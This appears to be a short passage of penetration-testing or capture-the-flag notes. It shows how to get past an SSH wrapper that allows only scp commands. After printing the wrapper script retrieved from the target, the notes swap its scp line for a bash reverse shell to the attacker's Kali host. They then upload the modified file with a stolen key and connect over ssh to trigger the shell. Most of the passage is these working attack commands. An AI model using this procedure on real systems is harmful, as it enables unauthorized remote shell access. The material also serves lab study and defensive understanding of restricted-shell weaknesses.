
#### Overwrite files on target (sshd_config)
\
```
scp -i file.pem user@remote_host:/home/user/file.json /local/path/to/save/
```
Source code retrieved from target:
```
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```
Notice "scp" is just a system command, so let's replace that line with a reverse shell:
```bash - kali
bash -i >& /dev/tcp/$KALI/443 0>&1
```
```bash - kali
scp -i id_rsa ../scp_wrapper.sh max@$TARGET:/home/max
```
```bash - kali
ssh -i id_rsa max@$TARGET
```
